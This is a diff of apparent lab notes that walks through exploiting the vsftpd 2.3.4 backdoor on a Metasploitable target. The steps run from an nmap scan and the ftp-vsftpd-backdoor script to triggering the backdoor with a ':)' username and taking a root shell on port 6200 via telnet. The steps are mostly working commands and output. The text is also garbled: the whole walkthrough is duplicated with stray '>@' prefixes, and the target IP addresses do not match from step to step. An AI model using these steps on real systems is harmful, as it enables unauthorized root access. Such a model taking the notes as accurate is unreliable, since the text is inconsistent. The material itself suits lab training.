@@ -1,16 +1,27 @@
+Vulnerability search and exploit with Nmap
+
+Nmap could be used to search for vulnerabilities and script be used to exploit that vulnerabilities. Here is an example.
+
+See: howto-0024-nse-nmap-scripting-engine.txt
+
+1. Scan the port 21.
 $ nmap -p21 10.0.2.4
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.3.4
 
+2. Find the version of the ftp server.
 $ nmap -p21 -sV 10.0.2.4
 PORT   STATE SERVICE VERSION                                                                                                                                                                                                               
 21/tcp open  ftp     vsftpd 2.3.4
 Service Info: OS: Unix
 
+3. Find for script related to vsftp.
 $ locate "*vsftp*.nse"
 /usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
 
+4. Use the script to exploit vulnerability. 
 $ nmap -p21 --script ftp-vsftpd-backdoor.nse 10.0.2.4
+---
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.3.4
 | ftp-vsftpd-backdoor: 
@@ -24,44 +35,76 @@ PORT   STATE SERVICE VERSION
 |       Shell command: id
 |       Results: uid=0(root) gid=0(root)
 |     References:
-|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
-|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
-|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html                             (1)
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523                                                     (2)
+|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb      (3)
 |_      https://www.securityfocus.com/bid/48539
 Service Info: OS: Unix
+---
 
->>> Read the references and find the backdoor installer.
+>>> Read the references (1) and find the backdoor installer.
+---
+The backdoor payload is interesting. In response to a :) smiley face in the FTP username, a TCP callback shell is attempted. 
+There is no obfuscation. More interestingly, there's no attempt to broadcast any notification of installation of the bad 
+package. So it's unclear how victims would be identified; and also pretty much guaranteed that any major redistributor would 
+notice the badness. Therefore, perhaps someone was just having some lulz instead of seriously trying to cause trouble. 
+---
 
+5. Create the backdoor.
 $ ftp 10.0.2.4
 user: user:)
 pwd:  pass
-> Wait few seconds for Backdoor injection (on port 6200).
-Ctrl-C
 
+> Wait few seconds for Backdoor injection (on port 6200).
+Ctrl-C then quit
+
+6. Locate the newly opened port.
 $ nmap -p6200 10.2.2.4
 PORT     STATE  SERVICE
 6200/tcp closed lm-x
 
-$ telnet 10.2.0.4 6200
-id; gives root 
-echo "Youre hacked" >> Hacked.txt; crée un fichier à la racine de la machine metaspoitable.
+7. Exploit the machine.
+$ telnet 10.2.0.4 6200                     -> nothing seems to be happen, but...
+id;                                        -> type any command (ended by ";") and you will see you are root on the machine.
+uid=0(root) gid=0(root
+
+pwd;
+/
+
+whoami;
+root
+
+echo "Youre hacked" >> Hacked.txt;         -> create a file at / on Metaspoitable machine.
 
 >@
->@##########################################################################################################################
+>@#############################################################################################################################
+>@#                                                                                                                           #
+>@# [ Vulnerability search and exploitation with Nmap ]                                                                       #
+>@#                                                                                                                           #
+>@# Nmap could be used to search for vulnerabilities and script be used to exploit that vulnerabilities. Here is an example.  #
+>@#                                                                                                                           #
+>@# See: howto-0024-nse-nmap-scripting-engine.txt                                                                             # 
+>@#                                                                                                                           #
+>@#---------------------------------------------------------------------------------------------------------------------------#
 >@
+>@1. Scan the port 21.
 >@$ nmap -p21 10.0.2.4
 >@PORT   STATE SERVICE VERSION
 >@21/tcp open  ftp     vsftpd 2.3.4
 >@
+>@2. Find the version of the ftp server.
 >@$ nmap -p21 -sV 10.0.2.4
->@PORT   STATE SERVICE VERSION                                                                                                                                                                                                               
+>@PORT   STATE SERVICE VERSION                    
 >@21/tcp open  ftp     vsftpd 2.3.4
 >@Service Info: OS: Unix
 >@
+>@3. Find for script related to vsftp.
 >@$ locate "*vsftp*.nse"
 >@/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
 >@
+>@4. Use the script to exploit vulnerability. 
 >@$ nmap -p21 --script ftp-vsftpd-backdoor.nse 10.0.2.4
+>@---
 >@PORT   STATE SERVICE VERSION
 >@21/tcp open  ftp     vsftpd 2.3.4
 >@| ftp-vsftpd-backdoor: 
@@ -75,27 +118,46 @@ echo "Youre hacked" >> Hacked.txt; crée un fichier à la racine de la machine m
 >@|       Shell command: id
 >@|       Results: uid=0(root) gid=0(root)
 >@|     References:
->@|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
->@|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
->@|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+>@|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html                             (1)
+>@|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523                                                     (2)
+>@|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb      (3)
 >@|_      https://www.securityfocus.com/bid/48539
 >@Service Info: OS: Unix
+>@---
 >@
->@>>> Read the references and find the backdoor installer.
+>@>>> Read the references (1) and find the backdoor installer.
+>@---
+>@The backdoor payload is interesting. In response to a :) smiley face in the FTP username, a TCP callback shell is attempted. 
+>@There is no obfuscation. More interestingly, there's no attempt to broadcast any notification of installation of the bad 
+>@package. So it's unclear how victims would be identified; and also pretty much guaranteed that any major redistributor would 
+>@notice the badness. Therefore, perhaps someone was just having some lulz instead of seriously trying to cause trouble. 
+>@---
 >@
+>@5. Create the backdoor.
 >@$ ftp 10.0.2.4
 >@user: user:)
 >@pwd:  pass
->@> Wait few seconds for Backdoor injection (on port 6200).
->@Ctrl-C
 >@
+>@> Wait few seconds for Backdoor injection (on port 6200).
+>@Ctrl-C then quit
+>@
+>@6. Locate the newly opened port.
 >@$ nmap -p6200 10.2.2.4
 >@PORT     STATE  SERVICE
->@6200/tcp closed lm-x
+>@>@6200/tcp closed lm-x
 >@
->@$ telnet 10.2.0.4 6200
->@id; gives root 
->@echo "Youre hacked" >> Hacked.txt; crée un fichier à la racine de la machine metaspoitable.
+>@7. Exploit the machine.
+>@$ telnet 10.2.0.4 6200                     -> nothing seems to be happen, but...
+>@id;                                        -> type any command (ended by ";") and you will see you are root on the machine.
+>@uid=0(root) gid=0(root
+>@
+>@pwd;
+>@/
+>@
+>@whoami;
+>@root
+>@
+>@echo "Youre hacked" >> Hacked.txt;         -> create a file at / on Metaspoitable machine.
 >@
 >@##########################################################################################################################
 >@
